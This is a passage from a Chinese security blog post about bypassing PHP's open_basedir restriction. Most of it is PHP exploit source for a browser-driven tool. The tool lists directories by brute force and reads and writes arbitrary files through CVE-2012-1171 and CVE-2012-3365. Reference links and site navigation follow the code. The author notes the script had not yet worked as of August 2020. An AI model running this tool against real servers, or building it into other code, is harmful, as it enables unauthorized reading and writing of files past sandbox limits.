class="keyword">global</span> $_DOM_exploit_resource;</span><br><span class="line">		stream_wrapper_register(<span class="string">'exploit'</span>, <span class="string">'StreamExploiter'</span>);</span><br><span class="line">		$_DOM_exploit_resource = fopen(<span class="string">"exploit://&#123;$this-&gt;getFilePath()&#125;"</span>, <span class="string">'w'</span>);</span><br><span class="line">		fwrite($_DOM_exploit_resource, $content);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DOMFileReader</span> <span class="keyword">extends</span> <span class="title">FileReader</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> extension_loaded(<span class="string">'dom'</span>) &amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.10'</span>, <span class="string">'&lt;='</span>) || version_compare(phpversion(), <span class="string">'5.4.0'</span>, <span class="string">'='</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// set it to global resource in order to trigger RSHUTDOWN</span></span><br><span class="line">		<span class="keyword">global</span> $_DOM_exploit_resource;</span><br><span class="line">		stream_wrapper_register(<span class="string">'exploit'</span>, <span class="string">'StreamExploiter'</span>);</span><br><span class="line">		$_DOM_exploit_resource = fopen(<span class="string">"exploit://&#123;$this-&gt;getFilePath()&#125;"</span>, <span class="string">'r'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SqliteFileWriter</span> <span class="keyword">extends</span> <span class="title">FileWriter</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> is_writable(getcwd())</span><br><span class="line">			&amp;&amp; (extension_loaded(<span class="string">'sqlite3'</span>) || extension_loaded(<span class="string">'sqlite'</span>))</span><br><span class="line">			&amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.15'</span>, <span class="string">'&lt;='</span>) || (version_compare(phpversion(), <span class="string">'5.4.5'</span>, <span class="string">'&lt;='</span>) &amp;&amp; PHP_MINOR_VERSION == <span class="number">4</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">		$sqlite_class = extension_loaded(<span class="string">'sqlite3'</span>) ? <span class="string">'sqlite3'</span> : <span class="string">'SQLiteDatabase'</span>;</span><br><span class="line">		mkdir(<span class="string">':memory:'</span>);</span><br><span class="line">		$payload_path = getRelativePath(getcwd() . <span class="string">'/:memory:'</span>, <span class="keyword">$this</span>-&gt;getFilePath());</span><br><span class="line">		$payload = str_replace(<span class="string">'\''</span>, <span class="string">'\'\''</span>, $content);</span><br><span class="line">		$database = <span class="keyword">new</span> $sqlite_class(<span class="string">":memory:/&#123;$payload_path&#125;"</span>);</span><br><span class="line">		$database-&gt;exec(<span class="string">"CREATE TABLE foo (bar STRING)"</span>);</span><br><span class="line">		$database-&gt;exec(<span class="string">"INSERT INTO foo (bar) VALUES ('&#123;$payload&#125;')"</span>);</span><br><span class="line">		$database-&gt;close();</span><br><span class="line">		rmdir(<span class="string">':memory:'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// End of Core</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = <span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) ? $_GET[<span class="string">'action'</span>] : <span class="string">''</span>;</span><br><span class="line">$cwd = <span class="keyword">isset</span>($_GET[<span class="string">'cwd'</span>]) ? $_GET[<span class="string">'cwd'</span>] : getcwd();</span><br><span class="line">$cwd = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;</span><br><span class="line">$directorLister = fallback(<span class="keyword">array</span>(<span class="string">'GlobWrapperDirectoryLister'</span>, <span class="string">'RealpathBruteForceDirectoryLister'</span>));</span><br><span class="line">$fileWriter = fallback(<span class="keyword">array</span>(<span class="string">'DOMFileWriter'</span>, <span class="string">'SqliteFileWriter'</span>));</span><br><span class="line">$fileReader = fallback(<span class="keyword">array</span>(<span class="string">'DOMFileReader'</span>));</span><br><span class="line">$append = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="comment">#panel &#123;</span></span><br><span class="line">  height: <span class="number">200</span>px;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#panel &gt; pre &#123;</span></span><br><span class="line">  margin: <span class="number">0</span>;</span><br><span class="line">  height: <span class="number">200</span>px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div id=<span class="string">"panel"</span>&gt;</span><br><span class="line">&lt;pre id=<span class="string">"dl"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Directory Listing:&lt;/legend&gt;Current Directory: &lt;input name=<span class="string">"cwd"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $cwd; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Go"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (get_class($directorLister) === <span class="string">'RealpathBruteForceDirectoryLister'</span>): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$characters = <span class="keyword">isset</span>($_GET[<span class="string">'characters'</span>]) ? $_GET[<span class="string">'characters'</span>] : $directorLister-&gt;characters;</span><br><span class="line">$maxlength = <span class="keyword">isset</span>($_GET[<span class="string">'maxlength'</span>]) ? $_GET[<span class="string">'maxlength'</span>] : $directorLister-&gt;maxlength;</span><br><span class="line">$append = <span class="string">"&amp;characters=&#123;$characters&#125;&amp;maxlength=&#123;$maxlength&#125;"</span>;</span><br><span class="line"> </span><br><span class="line">$directorLister-&gt;setMaxlength($maxlength);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Search Characters: &lt;input name=<span class="string">"characters"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $characters; ?&gt;"</span>&gt;</span><br><span class="line">Maxlength of File: &lt;input name=<span class="string">"maxlength"</span> size=<span class="string">"1"</span> value=<span class="string">"&lt;?php echo $maxlength; ?&gt;"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>;<span class="meta">?&gt;</span></span><br><span class="line">Description      : &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $directorLister-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="keyword">isset</span>($_GET[<span class="string">'file_path'</span>]) ? $_GET[<span class="string">'file_path'</span>] : <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;pre id=<span class="string">"rf"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Read File :&lt;/legend&gt;File Path: &lt;input name=<span class="string">"file_path"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $file_path; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Read"</span>&gt;</span><br><span class="line">Description: &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $fileReader-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"action"</span> value=<span class="string">"rf"</span>&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;pre id=<span class="string">"wf"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Write File :&lt;/legend&gt;File Path   : &lt;input name=<span class="string">"file_path"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $file_path; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Write"</span>&gt;</span><br><span class="line">File Content: &lt;textarea cols=<span class="string">"70"</span> name=<span class="string">"content"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">Description : &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $fileWriter-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"action"</span> value=<span class="string">"wf"</span>&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;a href=<span class="string">"#dl"</span>&gt;Directory Listing&lt;/a&gt; | &lt;a href=<span class="string">"#rf"</span>&gt;Read File&lt;/a&gt; | &lt;a href=<span class="string">"#wf"</span>&gt;Write File&lt;/a&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($action === <span class="string">'rf'</span>): <span class="meta">?&gt;</span></span><br><span class="line">&lt;plaintext&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fileReader-&gt;setFilePath($file_path);</span><br><span class="line"><span class="keyword">echo</span> $fileReader-&gt;read();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">elseif</span> ($action === <span class="string">'wf'</span>): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">	$fileWriter-&gt;setFilePath($file_path);</span><br><span class="line">	$fileWriter-&gt;write($_GET[<span class="string">'content'</span>]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'The file should be written.'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Something goes wrong.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">&lt;ol&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$directorLister-&gt;setCurrentPath($cwd);</span><br><span class="line">$file_list = $directorLister-&gt;getFileList();</span><br><span class="line">$parent_path = dirname($cwd);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='?cwd=&#123;$parent_path&#125;&#123;$append&#125;#dl'&gt;Parent&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (count($file_list) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($file_list <span class="keyword">as</span> $file) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='?cwd=&#123;$cwd&#125;&#123;$file&#125;&#123;$append&#125;#dl'&gt;&#123;$file&#125;&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'No files found. The path is probably not a directory.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/ol&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/php-script-neixinming.png" alt="php-script-neixinming"></p>
<ul>
<li>▲ 2020.08.29 脚本暂未成功绕过，但提供了一个绕过的思路</li>
</ul>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p>
</li>
<li><p><a href="https://www.jianshu.com/p/cf2cd07d02cf" target="_blank" rel="noopener">PHP绕过open_basedir限制操作文件的三种方法</a></p>
</li>
<li><p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">php5全版本绕过open_basedir读文件脚本</a></p>
</li>
<li><p><a href="https://blog.csdn.net/niexinming/article/details/53146095" target="_blank" rel="noopener">绕过open_basedir读文件脚本</a></p>
</li>
</ul>

            </div>
          

    
      <footer class="post-footer">
		

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/10/27/md%E6%96%87%E4%BB%B6/bypass_disable_function/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">WebShell下绕过disable_function</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/08/30/bypass_open_basedir/">
        <span class="next-text nav-default">PHP绕过open_basedir</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon"><span class="copyright-year">
    
        &copy;
    
        2019 -
    
    2020
    <span class="footer-author">Tomas.</span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  </body>
</html>
